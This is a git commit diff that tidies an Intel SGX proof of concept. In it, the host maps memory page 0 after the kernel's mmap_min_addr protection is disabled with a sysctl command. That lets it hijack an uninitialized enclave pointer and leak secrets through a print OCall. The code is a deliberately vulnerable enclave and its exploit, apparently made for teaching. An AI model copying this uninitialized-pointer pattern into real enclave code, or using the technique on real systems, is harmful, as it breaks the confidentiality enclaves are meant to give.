cc53253a728acc323fa26746c18d848b95c55a68
Tate, Hongliang Tian <tatetian@gmail.com>
2018-07-30 20:44:55 +0800

    Make the code more readable

--- App/App.cpp
+++ App/App.cpp
@@ -4,6 +4,9 @@
 #include <fcntl.h>
 #include <string.h>
 #include <errno.h>
+#include <signal.h>
+#include <unistd.h>
+#include <ucontext.h>
 
 #include "sgx_urts.h"
 #include "App.h"
@@ -12,61 +15,53 @@
 #define ENCLAVE_PATH "enclave.signed.so"
 
 sgx_status_t enclave_init();
-
 sgx_enclave_id_t enclave_id;
 
-#define _T(x) x
-
 int main() {
-    // Initialize the enclave
+    /* Initialize the enclave */
     sgx_status_t ret = enclave_init();
 
-    // Make NULL pointer deference valid
-    void* zeromap = mmap(0, 4096, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS
-| MAP_FIXED, -1, 0);
-    if(zeromap == MAP_FAILED){
-      printf("mmap fail\n");
-      perror("Error ");
-      return errno;
+    /* Make NULL pointer deference valid */
+    void* page0_mmapped = mmap(0, 4096, PROT_READ | PROT_WRITE,
+                               MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0);
+    if (page0_mmapped == MAP_FAILED) {
+        /* Be sure to run command `sysctl -w vm.mmap_min_addr="0"` before
+         * running this program!!!! */
+        perror("Memory-map at page 0 failed");
+        exit(-1);
     }
-    void * func;
+    /* Set the value at address 0 as a pointer to the function inside enclave
+     * that prints string */
+    uint64_t ocall_print_addr;
+    enclave_get_address_of_ocall_print(enclave_id, &ocall_print_addr);
+    *(void**)0 = (void*)ocall_print_addr;
 
-    enclave_get_address_of_ocall_print(enclave_id, &func);
-    memcpy(0, &func, sizeof(func));
-    
-    // Store at NULL the address of the print OCall, which is known at enclave initialization
-
-    // Ecall will leak the secret!!!
-    ecall_process_secret(enclave_id);
-
-    char *cur = (char *)zeromap;
-    do{
-    fprintf(stdout, "%c", *cur);
-    }while(*(++cur) != 0);
+    /* Call a sloppy implementation of ECall that leaks secret */
+    ecall_process_secret_sloppily(enclave_id);
 
     return 0;
 }
 
 sgx_status_t enclave_init() {
-  sgx_status_t ret = SGX_SUCCESS;
-  sgx_launch_token_t launch_token;
-  int launch_token_update = 0;
-  sgx_status_t status = SGX_SUCCESS;
+    sgx_status_t ret = SGX_SUCCESS;
+    sgx_launch_token_t launch_token;
+    int launch_token_update = 0;
+    sgx_status_t status = SGX_SUCCESS;
 
-  ret = sgx_create_enclave(_T(ENCLAVE_PATH), SGX_DEBUG_FLAG, &launch_token,
+    ret = sgx_create_enclave(ENCLAVE_PATH, SGX_DEBUG_FLAG, &launch_token,
        &launch_token_update, &enclave_id, NULL);
 
-  if (SGX_SUCCESS != ret) {
-    fprintf(stdout, "Create enclave failed [%s]. %u\n", __FUNCTION__, ret);
-  }
-  return ret;
-
+    if (SGX_SUCCESS != ret) {
+        fprintf(stdout, "Create enclave failed [%s]. %u\n", __FUNCTION__, ret);
+    }
+    return ret;
 }
+
 /* OCall functions */
 void ocall_print_string(const char *str)
 {
-    /* Proxy/Bridge will check the length and null-terminate 
-     * the input string to prevent buffer overflow. 
+    /* Proxy/Bridge will check the length and null-terminate
+     * the input string to prevent buffer overflow.
      */
     printf("%s", str);
 }
--- Enclave/Enclave.cpp
+++ Enclave/Enclave.cpp
@@ -29,44 +29,41 @@
  *
  */
 
-
-#include <stdarg.h>
-#include <stdio.h>      /* vsnprintf */
-#include <stdlib.h>
+/* file: Enclave.c */
 #include <string.h>
+#include <sgx_trts.h>
+#include "Enclave_t.h"  /* Import OCalls, e.g., `ocall_print` */
 
-#include "Enclave.h"
-#include "Enclave_t.h"  /* print_string */
-void ocall_print(const char *fmt, ...)
-{
-    char buf[BUFSIZ] = {'\0'};
-    va_list ap;
-    va_start(ap, fmt);
-    vsnprintf(buf, BUFSIZ, fmt, ap);
-    va_end(ap);
-    ocall_print_string(buf);
-}
-
-// file: enclave.c
-// Define a print OCall for debug purpose is very common in SGX programs
-
-// A function pointer in struct that should have been initialized
-struct secret_handler{
-  void(*handle_func)(const char*);
-  void* queue_buffer = 0;
+/* A struct that stores and processes secrets */
+struct secret_struct {
+    void (*func)(const char* str);
+    char data[64];
 };
-void *enclave_get_address_of_ocall_print(){
-  return (void*)ocall_print;
+
+/* A pointer that should have been initialized somewhere but is not */
+struct secret_struct* secret; /* = NULL, if not initialized */
+
+/* A privileged attacker could possibly memory-map at page 0 and thus
+ * effectively controls the `secret_struct` pointed by `secret`. On Linux,
+ * memory-mapping at low memory addresses is usually forbidden. But this
+ * restriction could be eliminated by using command `sudo sysctl -w
+ * vm.mmap_min_addr="0"`. */
+
+/* An ECall that consists of both **out-of-enclave** writes and reads */
+void ecall_process_secret_sloppily(void) {
+    /* Attack 1: a secret is leaked by writing to an out-of-enclave struct */
+    char secret_bytes[64];
+    sgx_read_rand((unsigned char*)secret_bytes, sizeof(secret_bytes));
+    memcpy(&secret->data, secret_bytes, sizeof(secret_bytes));
+
+    /* Attack 2: an arbitrary code chosen by attackers is executed by reading
+     * from an out-of-enclave struct. The attacker could set the func pointer
+     * to a dangerous OCall like `ocall_print`, thus leaking secret. */
+    const char* secret_str = "Top Secret!!!\n";
+    secret->func(secret_str);
 }
 
-// An ECall
-void ecall_process_secret() {
-  struct secret_handler *handler=0;
-  const char* secret = "Top Secret!!!\n";
 
-  handler->handle_func(secret);
-
-  handler = (struct secret_handler * )malloc(sizeof(handler));
-  memcpy(handler->queue_buffer, secret, strlen(secret));
-  free(handler);
+uint64_t enclave_get_address_of_ocall_print(void){
+    return (uint64_t)ocall_print_string;
 }
